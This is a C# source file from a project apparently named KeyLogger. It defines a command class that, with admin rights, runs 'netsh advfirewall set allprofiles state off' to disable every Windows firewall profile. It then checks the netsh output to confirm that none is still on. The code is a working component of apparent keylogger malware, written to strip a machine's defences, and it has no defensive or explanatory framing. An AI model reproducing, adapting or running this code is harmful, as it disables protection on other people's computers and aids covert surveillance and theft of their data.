using System;
using System.Text;

namespace KeyLogger.Commands
{
    /// <summary>
    /// Disable all firewall profiles
    /// </summary>
    public class TurnOffFirewall : ICommand
    {
        public void RunAsUser(string runFile) { }

        public void RunAsAdmin(string runFile)
        {
            var disable = CommandExtensions.PrepareCmdProcess("netsh advfirewall set allprofiles state off");
            CommandExtensions.RunProcess(disable);
        }

        public bool ChecksFailed()
        {
            var output = new StringBuilder();

            // Check if firewall is disabled
            var process = CommandExtensions.PrepareCmdProcess("netsh advfirewall show allprofiles state 2>&1");
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardInput = false;
            process.OutputDataReceived += (obj, eventArgs) => output.Append(eventArgs.Data);
            process.ErrorDataReceived += (obj, eventArgs) => output.Append(eventArgs.Data);
            CommandExtensions.RunProcess(process, p =>
            {
                p.Start();
                p.BeginErrorReadLine();
                p.BeginOutputReadLine();
                p.WaitForExit();
            });

            return output.ToString().Contains("ON", StringComparison.InvariantCultureIgnoreCase);
        }
    }
}